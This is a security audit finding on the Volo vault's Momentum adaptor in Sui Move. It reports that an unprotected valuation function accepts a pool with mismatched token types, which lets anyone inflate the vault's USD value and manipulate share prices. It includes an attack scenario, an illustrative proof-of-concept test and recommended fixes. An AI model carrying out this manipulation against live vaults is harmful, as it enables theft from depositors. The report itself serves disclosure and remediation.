# Audit Report

## Title
Unprotected Asset Type Mismatch in Momentum Position Valuation Enables USD Value Manipulation

## Summary
The `update_momentum_position_value()` function in the Momentum adaptor lacks authorization controls and type validation, allowing any attacker to provide a pool with mismatched token types that don't correspond to the position's actual tokens. This causes the vault to calculate and store incorrect USD values using wrong oracle prices, corrupting the vault's accounting and enabling share price manipulation.

## Finding Description

The vulnerability exists in the momentum adaptor's position valuation flow where there is a critical disconnect between the position's actual token types and the types used for valuation.

The `update_momentum_position_value()` function is marked as `public fun` without requiring `OperatorCap`, making it callable by anyone via Programmable Transaction Blocks. [1](#0-0) 

The MomentumPosition struct stores its actual token types in `type_x: TypeName` and `type_y: TypeName` fields, but these fields have no public getters exposed. [2](#0-1) [3](#0-2) 

The critical flaw occurs in `get_position_value()` which uses the generic type parameters from the caller-provided pool to fetch oracle prices, rather than the position's stored types. The function extracts type names from the generic parameters CoinA and CoinB and uses these to fetch prices from the oracle. [4](#0-3) 

Unlike the Cetus adaptor which validates position ownership through the pool by calling `pool.get_position_amounts(position_id)`, [5](#0-4)  the Momentum adaptor manually calculates amounts without any pool ID validation. [6](#0-5) 

The `finish_update_asset_value()` function only checks that the vault is enabled via `assert_enabled()`, which merely prevents calls when vault status is DISABLED, but has no OperatorCap requirement. [7](#0-6) [8](#0-7) 

**Attack Scenario:**
1. Vault contains a Momentum position for SUI-USDC (type_x=SUI, type_y=USDC) with 100 SUI and 200 USDC
2. Attacker finds a Momentum pool for high-value tokens (e.g., TOKEN_X worth $1000, TOKEN_Y worth $500) where the pool's price ratio matches within slippage tolerance
3. Attacker calls `update_momentum_position_value<PrincipalCoin, TOKEN_X, TOKEN_Y>(vault, config, clock, "momentum_position_1", malicious_pool)` via PTB
4. Function retrieves the SUI-USDC position (actual value ~$400) but values it using TOKEN_X and TOKEN_Y prices
5. The amounts (100, 200) get valued as: 100 × $1000 + 200 × $500 = $200,000 instead of $400
6. Slippage check passes because the malicious pool's TOKEN_X/TOKEN_Y price ratio matches the oracle
7. Vault stores the 500x inflated USD value

## Impact Explanation

This vulnerability enables direct economic damage to vault participants through three critical mechanisms:

**1. Share Price Manipulation**: The vault's `total_usd_value` is calculated by aggregating all asset values stored in the `assets_value` table. [9](#0-8)  Corrupted Momentum position values directly affect this total, which is used in share minting calculations. When executing deposits, shares are calculated as `user_shares = vault_utils::div_d(new_usd_value_deposited, share_ratio_before)`. [10](#0-9)  An attacker can inflate position values before depositing to receive more shares than entitled, or deflate values before withdrawing to extract more principal.

**2. Loss Tolerance Bypass**: The vault's loss tolerance mechanism tracks `cur_epoch_loss` and enforces a limit based on `loss_tolerance`. [11](#0-10)  By manipulating position valuations to appear higher, an attacker can make actual losses appear smaller than they are, bypassing this critical safety mechanism and enabling operations that should be blocked.

**3. Broken Accounting Invariant**: The vault's core invariant is that `total_usd_value` accurately reflects the USD value of all assets. This vulnerability fundamentally violates that invariant, undermining all financial operations and allowing systematic fund extraction from other vault participants.

The severity is **HIGH** because it requires no privileged access and directly enables fund theft.

## Likelihood Explanation

The attack is highly feasible:

**1. No Authorization**: The function is `public fun` callable by anyone via Sui PTB, requiring no operator capabilities or special permissions.

**2. Minimal Prerequisites**: Attacker only needs access to shared objects (Vault, OracleConfig, Clock) and a MomentumPool reference - all are standard accessible shared objects on Sui. No economic stake or vault participation required.

**3. Bypassable Protection**: The slippage check validates that the provided pool's price matches the oracle price for the PROVIDED generic types CoinA/CoinB, not the position's actual types. An attacker can find or create pools with different tokens whose price ratio happens to match within the configurable slippage tolerance (typically 1-5%).

**4. Repeatable**: Attack can be executed repeatedly via PTB to maintain manipulated valuations throughout an epoch, compounding the damage.

**5. Low Cost**: Only requires transaction gas costs, no capital lockup needed.

The attack complexity is **LOW** and economic barriers are **MINIMAL**.

## Recommendation

Implement type validation to ensure the provided pool's token types match the position's stored types. Since `type_x` and `type_y` have no public getters in the Position struct, the fix requires either:

**Option 1**: Add public getter functions to the Position struct to expose `type_x` and `type_y`, then validate them:
```move
public fun update_momentum_position_value<PrincipalCoinType, CoinA, CoinB>(
    vault: &mut Vault<PrincipalCoinType>,
    config: &OracleConfig,
    clock: &Clock,
    asset_type: String,
    pool: &mut MomentumPool<CoinA, CoinB>,
) {
    let position = vault.get_defi_asset<PrincipalCoinType, MomentumPosition>(asset_type);
    
    // Validate type parameters match position's stored types
    let type_name_a = into_string(get<CoinA>());
    let type_name_b = into_string(get<CoinB>());
    assert!(position.type_x() == get<CoinA>(), ERR_TYPE_MISMATCH);
    assert!(position.type_y() == get<CoinB>(), ERR_TYPE_MISMATCH);
    
    let usd_value = get_position_value(pool, position, config, clock);
    vault.finish_update_asset_value(asset_type, usd_value, clock.timestamp_ms());
}
```

**Option 2**: Validate that the pool's ID matches the position's stored `pool_id`:
```move
assert!(object::id(pool) == position.pool_id(), ERR_POOL_MISMATCH);
```

**Option 3**: Require `OperatorCap` authorization to restrict who can call value updates, similar to other privileged operations.

## Proof of Concept

```move
#[test]
fun test_momentum_type_mismatch_attack() {
    // Setup: Create vault with SUI-USDC Momentum position worth $400
    let mut vault = create_test_vault();
    let sui_usdc_position = create_momentum_position(SUI, USDC, 100, 200); // 100 SUI + 200 USDC
    vault.add_momentum_position(sui_usdc_position, "momentum_pos_1");
    
    // Setup oracle: SUI=$2, USDC=$1, TOKEN_X=$1000, TOKEN_Y=$500
    let mut oracle_config = create_oracle_config();
    oracle_config.set_price(SUI, 2_000_000_000); // $2 with 9 decimals
    oracle_config.set_price(USDC, 1_000_000_000); // $1
    oracle_config.set_price(TOKEN_X, 1000_000_000_000); // $1000
    oracle_config.set_price(TOKEN_Y, 500_000_000_000); // $500
    
    // Create malicious pool where TOKEN_X/TOKEN_Y ratio = 2 (matching SUI/USDC)
    let malicious_pool = create_momentum_pool<TOKEN_X, TOKEN_Y>(
        sqrt_price_for_ratio_2() // Pool price ratio = 2, same as SUI/USDC
    );
    
    // Initial vault value check
    assert!(vault.get_total_usd_value() == 400_000_000_000); // $400
    
    // ATTACK: Call update with mismatched types
    momentum_adaptor::update_momentum_position_value<PRINCIPAL, TOKEN_X, TOKEN_Y>(
        &mut vault,
        &oracle_config,
        &clock,
        "momentum_pos_1",
        &mut malicious_pool
    );
    
    // Position now valued as: 100 * $1000 + 200 * $500 = $200,000 (500x inflation!)
    assert!(vault.get_total_usd_value() == 200_000_000_000_000); // $200k instead of $400
    
    // Attacker can now deposit and receive 500x more shares than deserved
}
```

### Citations

**File:** volo-vault/sources/adaptors/momentum.adaptor.move (L21-32)
```text
public fun update_momentum_position_value<PrincipalCoinType, CoinA, CoinB>(
    vault: &mut Vault<PrincipalCoinType>,
    config: &OracleConfig,
    clock: &Clock,
    asset_type: String,
    pool: &mut MomentumPool<CoinA, CoinB>,
) {
    let position = vault.get_defi_asset<PrincipalCoinType, MomentumPosition>(asset_type);
    let usd_value = get_position_value(pool, position, config, clock);

    vault.finish_update_asset_value(asset_type, usd_value, clock.timestamp_ms());
}
```

**File:** volo-vault/sources/adaptors/momentum.adaptor.move (L34-67)
```text
public fun get_position_value<CoinA, CoinB>(
    pool: &MomentumPool<CoinA, CoinB>,
    position: &MomentumPosition,
    config: &OracleConfig,
    clock: &Clock,
): u256 {
    let (amount_a, amount_b, sqrt_price) = get_position_token_amounts(pool, position);

    let type_name_a = into_string(get<CoinA>());
    let type_name_b = into_string(get<CoinB>());

    let decimals_a = config.coin_decimals(type_name_a);
    let decimals_b = config.coin_decimals(type_name_b);

    // Oracle price has 18 decimals
    let price_a = vault_oracle::get_asset_price(config, clock, type_name_a);
    let price_b = vault_oracle::get_asset_price(config, clock, type_name_b);
    let relative_price_from_oracle = price_a * DECIMAL / price_b;

    let pool_price = sqrt_price_x64_to_price(sqrt_price, decimals_a, decimals_b);
    let slippage = config.dex_slippage();
    assert!(
        (pool_price.diff(relative_price_from_oracle) * DECIMAL  / relative_price_from_oracle) < (DECIMAL  * slippage / SLIPPAGE_BASE),
        ERR_INVALID_POOL_PRICE,
    );

    let normalized_price_a = vault_oracle::get_normalized_asset_price(config, clock, type_name_a);
    let normalized_price_b = vault_oracle::get_normalized_asset_price(config, clock, type_name_b);

    let value_a = vault_utils::mul_with_oracle_price(amount_a as u256, normalized_price_a);
    let value_b = vault_utils::mul_with_oracle_price(amount_b as u256, normalized_price_b);

    value_a + value_b
}
```

**File:** volo-vault/sources/adaptors/momentum.adaptor.move (L69-91)
```text
public fun get_position_token_amounts<CoinA, CoinB>(
    pool: &MomentumPool<CoinA, CoinB>,
    position: &MomentumPosition,
): (u64, u64, u128) {
    let sqrt_price = pool.sqrt_price();

    let lower_tick = position.tick_lower_index();
    let upper_tick = position.tick_upper_index();

    let lower_tick_sqrt_price = tick_math::get_sqrt_price_at_tick(lower_tick);
    let upper_tick_sqrt_price = tick_math::get_sqrt_price_at_tick(upper_tick);

    let liquidity = position.liquidity();

    let (amount_a, amount_b) = liquidity_math::get_amounts_for_liquidity(
        sqrt_price,
        lower_tick_sqrt_price,
        upper_tick_sqrt_price,
        liquidity,
        false,
    );
    (amount_a, amount_b, sqrt_price)
}
```

**File:** volo-vault/local_dependencies/mmt_v3/sources/position.move (L10-24)
```text
    public struct Position has store, key {
        id: UID,
        pool_id: ID,
        fee_rate: u64,
        type_x: TypeName,
        type_y: TypeName,
        tick_lower_index: I32,
        tick_upper_index: I32,
        liquidity: u128,
        fee_growth_inside_x_last: u128,
        fee_growth_inside_y_last: u128,
        owed_coin_x: u64,
        owed_coin_y: u64,
        reward_infos: vector<PositionRewardInfo>,
    }
```

**File:** volo-vault/local_dependencies/mmt_v3/sources/position.move (L49-59)
```text
    // public getter functions
    public fun reward_length(position: &Position) : u64 { abort 0 }
    public fun tick_lower_index(position: &Position) : I32 { abort 0 }
    public fun tick_upper_index(position: &Position) : I32 { abort 0 }
    public fun liquidity(position: &Position) : u128 { abort 0 }
    public fun owed_coin_x(position: &Position) : u64 { abort 0 }
    public fun owed_coin_y(position: &Position) : u64 { abort 0 }
    public fun fee_growth_inside_x_last(position: &Position) : u128 { abort 0 }
    public fun fee_growth_inside_y_last(position: &Position) : u128 { abort 0 }
    public fun fee_rate(position: &Position) : u64 { abort 0 }
    public fun pool_id(position: &Position) : ID { abort 0 }
```

**File:** volo-vault/sources/adaptors/cetus_adaptor.move (L39-41)
```text
    let position_id = object::id(position);

    let (amount_a, amount_b) = pool.get_position_amounts(position_id);
```

**File:** volo-vault/sources/volo_vault.move (L626-641)
```text
public(package) fun update_tolerance<T0>(self: &mut Vault<T0>, loss: u256) {
    self.check_version();

    self.cur_epoch_loss = self.cur_epoch_loss + loss;

    // let loss_limit = usd_value_before * (self.loss_tolerance as u256) / (RATE_SCALING as u256);
    let loss_limit =
        self.cur_epoch_loss_base_usd_value * (self.loss_tolerance as u256) / (RATE_SCALING as u256);

    assert!(loss_limit >= self.cur_epoch_loss, ERR_EXCEED_LOSS_LIMIT);
    emit(LossToleranceUpdated {
        vault_id: self.vault_id(),
        current_loss: self.cur_epoch_loss,
        loss_limit: loss_limit,
    });
}
```

**File:** volo-vault/sources/volo_vault.move (L645-647)
```text
public(package) fun assert_enabled<PrincipalCoinType>(self: &Vault<PrincipalCoinType>) {
    assert!(self.status() != VAULT_DISABLED_STATUS, ERR_VAULT_NOT_ENABLED);
}
```

**File:** volo-vault/sources/volo_vault.move (L806-854)
```text
public(package) fun execute_deposit<PrincipalCoinType>(
    self: &mut Vault<PrincipalCoinType>,
    clock: &Clock,
    config: &OracleConfig,
    request_id: u64,
    max_shares_received: u256,
) {
    self.check_version();
    self.assert_normal();

    assert!(self.request_buffer.deposit_requests.contains(request_id), ERR_REQUEST_NOT_FOUND);

    // Current share ratio (before counting the new deposited coin)
    // This update should generate performance fee if the total usd value is increased
    let total_usd_value_before = self.get_total_usd_value(clock);
    let share_ratio_before = self.get_share_ratio(clock);

    let deposit_request = *self.request_buffer.deposit_requests.borrow(request_id);
    assert!(deposit_request.vault_id() == self.id.to_address(), ERR_VAULT_ID_MISMATCH);

    // Get the coin from the buffer
    let coin = self.request_buffer.deposit_coin_buffer.remove(request_id);
    let coin_amount = deposit_request.amount();

    let deposit_fee = coin_amount * self.deposit_fee_rate / RATE_SCALING;

    // let actual_deposit_amount = coin_amount - deposit_fee;
    let mut coin_balance = coin.into_balance();
    // Split the deposit fee to the fee collected
    let deposit_fee_balance = coin_balance.split(deposit_fee as u64);
    self.deposit_withdraw_fee_collected.join(deposit_fee_balance);

    self.free_principal.join(coin_balance);
    update_free_principal_value(self, config, clock);

    let total_usd_value_after = self.get_total_usd_value(clock);
    let new_usd_value_deposited = total_usd_value_after - total_usd_value_before;

    let user_shares = vault_utils::div_d(new_usd_value_deposited, share_ratio_before);
    let expected_shares = deposit_request.expected_shares();
    // Negative slippage is determined by the "expected_shares"
    // Positive slippage is determined by the "max_shares_received"
    assert!(user_shares > 0, ERR_ZERO_SHARE);
    assert!(user_shares >= expected_shares, ERR_UNEXPECTED_SLIPPAGE);
    assert!(user_shares <= max_shares_received, ERR_UNEXPECTED_SLIPPAGE);

    // Update total shares in the vault
    self.total_shares = self.total_shares + user_shares;

```

**File:** volo-vault/sources/volo_vault.move (L1174-1195)
```text
public(package) fun finish_update_asset_value<PrincipalCoinType>(
    self: &mut Vault<PrincipalCoinType>,
    asset_type: String,
    usd_value: u256,
    now: u64,
) {
    self.check_version();
    self.assert_enabled();

    let last_update_time = &mut self.assets_value_updated[asset_type];
    *last_update_time = now;

    let position_value = &mut self.assets_value[asset_type];
    *position_value = usd_value;

    if (
        self.status() == VAULT_DURING_OPERATION_STATUS 
        && self.op_value_update_record.value_update_enabled 
        && self.op_value_update_record.asset_types_borrowed.contains(&asset_type)
    ) {
        self.op_value_update_record.asset_types_updated.add(asset_type, true);
    };
```

**File:** volo-vault/sources/volo_vault.move (L1254-1279)
```text
public(package) fun get_total_usd_value<PrincipalCoinType>(
    self: &Vault<PrincipalCoinType>,
    clock: &Clock,
): u256 {
    self.check_version();
    self.assert_enabled();

    let now = clock.timestamp_ms();
    let mut total_usd_value = 0;

    self.asset_types.do_ref!(|asset_type| {
        let last_update_time = *self.assets_value_updated.borrow(*asset_type);
        assert!(now - last_update_time <= MAX_UPDATE_INTERVAL, ERR_USD_VALUE_NOT_UPDATED);

        let usd_value = *self.assets_value.borrow(*asset_type);
        total_usd_value = total_usd_value + usd_value;
    });

    emit(TotalUSDValueUpdated {
        vault_id: self.vault_id(),
        total_usd_value: total_usd_value,
        timestamp: now,
    });

    total_usd_value
}
```
